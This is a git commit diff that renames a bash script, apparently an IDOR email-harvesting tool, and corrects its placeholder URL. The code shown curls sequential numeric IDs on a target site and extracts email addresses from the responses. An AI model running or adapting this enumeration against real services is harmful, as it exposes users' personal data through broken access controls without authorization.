79a48251b407226c643c93e498183b2b38355060
Bryson-Rice <96259823+Bryson-Rice@users.noreply.github.com>
2023-03-22 14:50:45 -0400

    Update and rename IDOR-Email.sh to IDOR-Email-exactor.sh
    corrected example url and updated name

--- IDOR-Email-exactor.sh
+++ IDOR-Email-exactor.sh
@@ -10,7 +10,7 @@ end_num=10000
 # Define a function to make the curl request and filter for email addresses
 function make_request() {
     local num=$1
-    curl -s https://example/com/$num 2>/dev/null | grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"
+    curl -s https://example.com/$num 2>/dev/null | grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b"
     echo "Request $num complete"
 }
 
